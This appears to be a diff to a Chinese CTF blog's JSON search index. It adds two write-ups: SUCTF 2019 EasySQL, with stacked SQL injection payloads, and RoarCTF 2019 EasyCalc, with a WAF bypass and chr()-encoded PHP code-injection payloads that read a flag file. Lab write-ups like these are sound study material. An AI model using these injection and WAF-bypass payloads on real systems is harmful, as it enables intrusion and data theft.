@@ -1,5 +1,17 @@
 [
   {
+    "objectID": "1750433820",
+    "permalink": "/post/suctf-2019_easysql/",
+    "title": "SUCTF 2019_EasySQL","content": "\r思路\r1、ban了很多东西-关键是and or \u0026amp;\u0026amp; ||等连接词、^可以用 2、or误伤了information_schema,经过多次尝试发现限制了长度，意味着报错和盲注都无法进行，应该意识到是堆叠注入\n1;show tables; 3、ban了Flag,无法用handler语句；ban了from,无法用预处理\n4、题目突破点在于Give me your flag, I will tell you if the flag is right. 猜测后端源码为\nselect $_POST[\u0026#39;query\u0026#39;] || flog from Flag; 解法一\rpyaload\nquery= *,1 解法二\rtips mysql的全局变量sql_mode，为PIPES_AS_CONCAT 会将||认为字符串的连接符，而不是或运算符，这时||符号就像concat函数一样。 则payload为\n1;set sql_mode=PIPES_AS_CONCAT;select 1 ","date": "2025-06-20 23:37:00",
+    "updated": "2025-06-20 23:37:00"
+  }, 
+  {
+    "objectID": "1750433316",
+    "permalink": "/post/roarctf-2019_easycalc/",
+    "title": "RoarCTF 2019_EasyCalc","content": "\r思路\r1、前端源码提示WAF和calc.php\n2、访问calc.php,题目代码\n\u0026lt;?php error_reporting(0); if(!isset($_GET[\u0026#39;num\u0026#39;])){ show_source(__FILE__); }else{ $str = $_GET[\u0026#39;num\u0026#39;]; $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;,\u0026#39;\\$\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;\\^\u0026#39;]; foreach ($blacklist as $blackitem) { if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $str)) { die(\u0026#34;what are you want to do?\u0026#34;); } } eval(\u0026#39;echo \u0026#39;.$str.\u0026#39;;\u0026#39;); } ?\u0026gt; 题目代码很简单，但是存在WAF\n解题\rWAF绕过\r通过测试发现WAF针对num变量过滤了字符，只能传数字 这里通过php字符串解析特性来bypass php正常通过$_GET和$_POST接受参数时会做两件事\n1.删除前后的空白符（空格符，制表符，换行符等统称为空白符） 2.将某些字符转换为下划线（包括空格） WAF或是IDS/IPS等防护设备中对该流量分析时基于自己的方式接受数据 此时如果传入?%20num=,WAF认为该参数名为%20num,但是php代码确实接受到了所传的数据，就达到了绕过WAF的效果\nRCE\r传入?%20num=shell_exec('ls')没有触发,可能ban了函数\n传入?%20num=phpinfo(),全局搜索disable_functions\nban了这么多命令执行的函数，直接考虑代码执行\n代码执行\r总结一下常用的函数\nvar_dump() print_r() scandir() getcwd() //相当与pwd getenv() //相当与env file_get_contents() highlight_file() show_source() read_file() readgzfile() chr() 当前目录没有，那就scandir根目录 /被ban了，这里用chr()函数bypass\nphp \u0026gt; var_dump(chr(47)); string(1) \u0026#34;/\u0026#34; 发现f1agg文件，读取文件，用file_get_contents搭配chr读取文件\n?%20num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))); 这里练习一下脚本，把所有数字嵌套上chr,这道题比较短，有长的，手工敲就不方便了\n\u0026lt;?php $a=\u0026#34;47 102 49 97 103 103\u0026#34;; function all_chr($a){ $arr=explode(\u0026#34; \u0026#34;,$a); for($i=0;$i\u0026lt;count($arr);$i++){$arr[$i]=\u0026#34;chr($arr[$i])\u0026#34;;} return join(\u0026#34;.\u0026#34;,$arr); } echo all_chr($a); ?\u0026gt; ","date": "2025-06-20 23:28:36",
+    "updated": "2025-06-20 23:28:36"
+  }, 
+  {
     "objectID": "1750344318",
     "permalink": "/post/%E6%9C%AC%E7%AB%99%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8D%97/",
     "title": "本站食用指南","content": "\r首页\r三大类\nCTF-Great 收集一些比较好的题目\nwriteup 比赛writeup记录和靶场记录\nLeading 网络安全学习\n侧边栏和归档\r这两处作用相同，进行分类、归档\n配有标签，方便食用 其他\r其他就不废话了，md，突然感觉一篇都是废话，一句话，欢迎订阅和打赏\n搜索栏 评论 关灯 啥的 ","date": "2025-06-19 22:45:18",
